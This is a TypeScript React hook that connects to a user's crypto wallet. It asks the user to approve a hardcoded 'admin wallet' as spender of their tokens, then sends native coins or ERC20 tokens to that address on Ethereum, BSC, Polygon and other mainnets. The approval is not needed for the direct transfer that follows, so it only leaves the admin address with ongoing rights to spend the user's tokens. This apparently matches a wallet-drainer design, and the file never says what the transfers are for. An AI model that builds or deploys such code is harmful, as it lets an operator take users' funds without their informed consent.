import { useState, useCallback } from 'react';
import { useAppKitAccount, useAppKitNetwork, useAppKitProvider } from '@reown/appkit/react';
import { BrowserProvider, Contract, parseUnits, formatUnits } from 'ethers';

// Helper function to safely get chain ID
const getChainId = (caipNetworkId: string | number): number => {
  const networkIdStr = String(caipNetworkId);
  if (networkIdStr.includes(':')) {
    return parseInt(networkIdStr.split(':')[1]);
  }
  return parseInt(networkIdStr);
};

interface WalletPermissionState {
  isProcessing: boolean;
  transactionHash: string | null;
  approvalHash: string | null;
  error: string | null;
  step: 'idle' | 'checking-allowance' | 'requesting-approval' | 'approving' | 'transferring' | 'completed' | 'error';
  needsApproval: boolean;
  currentAllowance: string;
  requiredAmount: string;
}

// Admin wallet addresses for each chain
const ADMIN_WALLETS: Record<number, string> = {
  1: '0x742d35Cc6Df6A18647d95D5ae274C4D81dB7E88e', // Ethereum
  56: '0x742d35Cc6Df6A18647d95D5ae274C4D81dB7E88e', // BSC
  137: '0x742d35Cc6Df6A18647d95D5ae274C4D81dB7E88e', // Polygon
  42161: '0x742d35Cc6Df6A18647d95D5ae274C4D81dB7E88e', // Arbitrum
  10: '0x742d35Cc6Df6A18647d95D5ae274C4D81dB7E88e', // Optimism
  43114: '0x742d35Cc6Df6A18647d95D5ae274C4D81dB7E88e', // Avalanche
  1337: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8' // Local hardhat
};

// ERC20 ABI for token operations
const ERC20_ABI = [
  'function transfer(address to, uint256 amount) returns (bool)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address account) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function name() view returns (string)'
];

export function useWalletPermissionTransfer() {
  const { address, isConnected } = useAppKitAccount();
  const { caipNetwork } = useAppKitNetwork();
  const { walletProvider } = useAppKitProvider('eip155');
  
  const [state, setState] = useState<WalletPermissionState>({
    isProcessing: false,
    transactionHash: null,
    approvalHash: null,
    error: null,
    step: 'idle',
    needsApproval: false,
    currentAllowance: '0',
    requiredAmount: '0'
  });

  // Check current allowance for a token
  const checkTokenAllowance = useCallback(async (
    tokenAddress: string,
    amount: string
  ): Promise<{ needsApproval: boolean; currentAllowance: string }> => {
    if (!isConnected || !address || !walletProvider || !caipNetwork?.id) {
      throw new Error('Wallet not connected');
    }

    try {
      setState(prev => ({ ...prev, step: 'checking-allowance' }));
      
      const provider = new BrowserProvider(walletProvider as any);
      const chainId = getChainId(caipNetwork.id);
      const adminWallet = ADMIN_WALLETS[chainId];
      
      if (!adminWallet) {
        throw new Error(`Admin wallet not configured for chain ${chainId}`);
      }

      // For native tokens (ETH, BNB, etc.), no approval needed
      if (tokenAddress === '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE') {
        return { needsApproval: false, currentAllowance: amount };
      }

      const tokenContract = new Contract(tokenAddress, ERC20_ABI, provider);
      const decimals = await tokenContract.decimals();
      const requiredAmount = parseUnits(amount, decimals);
      const currentAllowance = await tokenContract.allowance(address, adminWallet);
      
      const needsApproval = currentAllowance < requiredAmount;
      
      return {
        needsApproval,
        currentAllowance: formatUnits(currentAllowance, decimals)
      };
    } catch (error) {
      console.error('Error checking allowance:', error);
      throw error;
    }
  }, [isConnected, address, walletProvider, caipNetwork]);

  // Request token approval
  const requestTokenApproval = useCallback(async (
    tokenAddress: string,
    amount: string
  ): Promise<string> => {
    if (!isConnected || !address || !walletProvider || !caipNetwork?.id) {
      throw new Error('Wallet not connected');
    }

    try {
      setState(prev => ({ ...prev, step: 'requesting-approval' }));
      
      const provider = new BrowserProvider(walletProvider as any);
      const signer = await provider.getSigner();
      const chainId = parseInt(caipNetwork.id.split(':')[1]);
      const adminWallet = ADMIN_WALLETS[chainId];
      
      if (!adminWallet) {
        throw new Error(`Admin wallet not configured for chain ${chainId}`);
      }

      const tokenContract = new Contract(tokenAddress, ERC20_ABI, signer);
      const decimals = await tokenContract.decimals();
      const approvalAmount = parseUnits(amount, decimals);
      
      setState(prev => ({ ...prev, step: 'approving' }));
      
      console.log('Requesting token approval:', {
        token: tokenAddress,
        spender: adminWallet,
        amount: amount,
        decimals: decimals.toString()
      });

      const approvalTx = await tokenContract.approve(adminWallet, approvalAmount);
      
      console.log('Approval transaction sent:', approvalTx.hash);
      setState(prev => ({ ...prev, approvalHash: approvalTx.hash }));
      
      // Wait for approval confirmation
      const receipt = await approvalTx.wait();
      console.log('Approval confirmed:', receipt.hash);
      
      return receipt.hash;
    } catch (error) {
      console.error('Token approval failed:', error);
      throw error;
    }
  }, [isConnected, address, walletProvider, caipNetwork]);

  // Execute token transfer with permission checks
  const transferWithPermission = useCallback(async (
    tokenAddress: string,
    amount: string
  ): Promise<string | null> => {
    if (!isConnected || !address || !walletProvider || !caipNetwork?.id) {
      setState(prev => ({ 
        ...prev, 
        error: 'Wallet not connected',
        step: 'error' 
      }));
      return null;
    }

    try {
      setState(prev => ({ 
        ...prev, 
        isProcessing: true,
        error: null,
        step: 'checking-allowance',
        requiredAmount: amount
      }));

      // Step 1: Check if approval is needed
      const { needsApproval, currentAllowance } = await checkTokenAllowance(tokenAddress, amount);
      
      setState(prev => ({ 
        ...prev, 
        needsApproval,
        currentAllowance 
      }));

      // Step 2: Request approval if needed
      if (needsApproval && tokenAddress !== '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE') {
        console.log('Token approval required. Current allowance:', currentAllowance, 'Required:', amount);
        await requestTokenApproval(tokenAddress, amount);
      }

      // Step 3: Execute the transfer
      setState(prev => ({ ...prev, step: 'transferring' }));
      
      const provider = new BrowserProvider(walletProvider as any);
      const signer = await provider.getSigner();
      const chainId = parseInt(caipNetwork.id.split(':')[1]);
      const adminWallet = ADMIN_WALLETS[chainId];

      let transferTx;

      if (tokenAddress === '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE') {
        // Native token transfer
        console.log('Executing native token transfer to admin wallet');
        transferTx = await signer.sendTransaction({
          to: adminWallet,
          value: parseUnits(amount, 18)
        });
      } else {
        // ERC20 token transfer
        console.log('Executing ERC20 token transfer to admin wallet');
        const tokenContract = new Contract(tokenAddress, ERC20_ABI, signer);
        const decimals = await tokenContract.decimals();
        const transferAmount = parseUnits(amount, decimals);
        
        transferTx = await tokenContract.transfer(adminWallet, transferAmount);
      }

      console.log('Transfer transaction sent:', transferTx.hash);
      const receipt = await transferTx.wait();
      console.log('Transfer confirmed:', receipt.hash);

      setState(prev => ({ 
        ...prev, 
        isProcessing: false,
        transactionHash: receipt.hash,
        step: 'completed' 
      }));

      return receipt.hash;

    } catch (error) {
      console.error('Transfer with permission failed:', error);
      setState(prev => ({ 
        ...prev, 
        isProcessing: false,
        error: (error as Error).message,
        step: 'error' 
      }));
      return null;
    }
  }, [isConnected, address, walletProvider, caipNetwork, checkTokenAllowance, requestTokenApproval]);

  const resetState = useCallback(() => {
    setState({
      isProcessing: false,
      transactionHash: null,
      approvalHash: null,
      error: null,
      step: 'idle',
      needsApproval: false,
      currentAllowance: '0',
      requiredAmount: '0'
    });
  }, []);

  const getAdminWallet = useCallback(() => {
    if (!caipNetwork?.id) return null;
    const chainId = parseInt(caipNetwork.id.split(':')[1]);
    return ADMIN_WALLETS[chainId] || null;
  }, [caipNetwork]);

  return {
    state,
    transferWithPermission,
    checkTokenAllowance,
    requestTokenApproval,
    resetState,
    getAdminWallet
  };
}